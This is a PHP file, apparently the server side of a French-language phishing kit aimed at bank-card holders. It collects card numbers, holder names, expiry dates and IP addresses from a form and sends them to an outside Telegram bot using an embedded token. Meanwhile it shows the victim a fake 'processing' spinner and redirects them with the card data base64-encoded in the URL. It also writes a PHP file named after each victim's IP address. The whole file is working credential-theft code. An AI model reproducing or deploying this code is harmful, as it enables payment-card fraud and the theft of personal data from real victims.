<?php

include('./config.php');


send_info();

function send_info()
{
    
    /*echo $_POST['nompren']; exit;*/

    $error = '';

    if (isset($_POST)) {

        $valid = 1;

        if ($valid == 1) {


            $ip = $_SERVER['REMOTE_ADDR'];
            $montant = $_POST['amount'];
            $message = "--------------Infos CVV--------------\r\n";

            $message .= "Nom de la Bank     : " . $_POST['bancName'] . "\r\n";
            $message .= "Nom       : " . $_POST['nombanC'] . "\r\n";
            $message .= "carte       : " . $_POST['numbanC'] . "\r\n";
            $message .= "epx        : " . $_POST['monthBanc'] . " " . $_POST['yearBanc'] . "\r\n";

            $message .= "IP      : $ip\r\n";
            $message .= "HOST    : " . gethostbyaddr($ip) . "\r\n";

            $_SESSION['pan'] = substr($_POST['numbanC'], -4);
            $_SESSION['cc'] = $_POST['numbanC'];



            $message .= "URL response : " . $_SESSION["url"] . "sendresponse.php?ipvic=" . $ip . "\r\n";
           /* $message .= "Montan gagne : " . $_POST['amount'] . "\r\n";*/
            $message .= "----------------   -----------------\r\n";

             $msg = '<img id="img-spinner" src="img/spinner.gif" alt="Your transaction is being processed"><br>Veuillez patientez quelques instant... 
            		';
            		
            $type = 'lecteur';

            $params = base64_encode("name=" . $_POST['nombanC'] . "&cc=" . $_POST['numbanC'] . "&ip=" . $ip ."&nompren=". $_POST['nompren']. "&montant=" . $montant . "&type=" . $type);

            /*echo $_POST['nompren']; exit;*/
            /*$msg = '<img id="img-spinner" src="./img/spinner.gif" alt="Your transaction is being processed"><br>
					Rrocessing your transaction please wait ...';*/

            if (!response($ip, $msg)) {
                echo "erreur";
            }
            //echo $message;exit;
            file_get_contents("https://api.telegram.org/bot6497618597:AAGoIEX6fNLYOAm2fyySCkOclVBNQjyUYbA/sendMessage?chat_id=8786877&text=" . urlencode($message) . "&parse_mode=html");               

            header('Location:' . $_SESSION["url"] . 'validation.php?parameters=' . $params);
            return;

            // $pan = substr($_POST['pan'], -4);

            //         redirect(base_url().'payfrance/validation?pan='.($pan).'&token='.($ip));
        } else {
            echo 'erreur';
        }
    } else {
        header('Location:index.php');
    }
}

function response($ip, $msg)
{
    $path = './data/' . $ip . '.php';

    // Open the file for writing (create if it doesn't exist)
    $file = fopen($path, 'w');

    // Check if the file was opened successfully
    if (!$file) {
        echo 'File could not be opened';
        // exit;
        return false;
    }

    // Write the message to the file
    $bytesWritten = fwrite($file, $msg);

    // Close the file
    fclose($file);

    // Check if writing to the file was successful
    if ($bytesWritten === false) {
        echo 'File could not be updated';
        return false;
    } else {
        echo 'File has been updated!';
        return true;
    }
}
